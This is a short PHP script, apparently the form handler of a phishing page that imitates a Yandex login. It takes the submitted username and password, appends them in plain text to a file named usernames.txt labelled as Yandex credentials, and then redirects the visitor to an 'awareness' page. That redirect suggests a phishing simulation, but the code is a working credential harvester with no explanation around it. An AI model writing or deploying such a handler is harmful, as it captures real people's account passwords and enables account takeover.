<?php

file_put_contents("usernames.txt", "Yandex Username: " . $_POST['login'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: /awareness.php');
exit();
?>
<script src="/validation.js"></script>
